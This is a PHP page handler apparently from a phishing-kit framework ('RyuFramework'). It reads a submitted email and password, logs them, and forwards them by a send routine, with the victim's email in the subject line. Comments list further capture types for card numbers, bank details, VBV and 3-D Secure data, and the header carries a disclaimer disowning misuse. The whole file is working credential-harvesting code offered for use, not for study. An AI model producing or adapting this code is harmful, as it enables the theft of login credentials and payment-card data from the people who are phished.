<?php

/**
 * ------------------------------------------------------
 * FILE GENERATED FROM RYUCLI ( Thu,25-11-2021 22:18 )
 * @filename welcome.php
 * ------------------------------------------------------
 *
 * @package RyuFramework
 * 
 * @author shinryu
 * @version v3.0-21
 * @copyright 2021 shinryujin
 *
 *
 * @disclaimer : 
 * This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
 * All legal forms are submitted to their respective users 
 *
 **/




if ($this->getPost()) {
        $data = [];
        $data = inputs([

                'email'        =>  'email',
                'password'     =>  'password',


        ]);

        extract($data);

        $initialize = [

                'continue'    => $this->router('welcome')['short'],

                /** 
                 * @var $type_log
                 * Ex : login ,card , pap , bank ,email_login , card-vbv , access 
                 * **/
                'type_log'    => 'welcome',

                /** 
                 * @var $desc_log 
                 * can use : format_desc_log('to do text', $data) 
                 * **/
                'desc_log'    => format_desc_log('doing something', $data),

                /**
                 * @var $type_send
                 * Ex : account,card,photo,bank,email,card-vbv,3dsecure 
                 * **/
                'type_send'    => 'account',

                /**
                 * @var $subject_send
                 * Can use : format_subject_card($num,$bin) 
                 **/
                'subject_send' => 'YOUR SUBJECT  ' . strtoupper($email),

                /**
                 * @var $from_send
                 * can use : format_from()
                 **/
                'from_send' => format_from()
        ];

        extract($initialize);






        $send = [
                'from'    => $from_send,
                'subject' => $subject_send,
                'type'    => $type_send,
                'data'    => $data
        ];

        $log = [
                'type'   => $type_log,
                'desc'   => $desc_log
        ];


        return $this->send($send, $log, $continue);
}
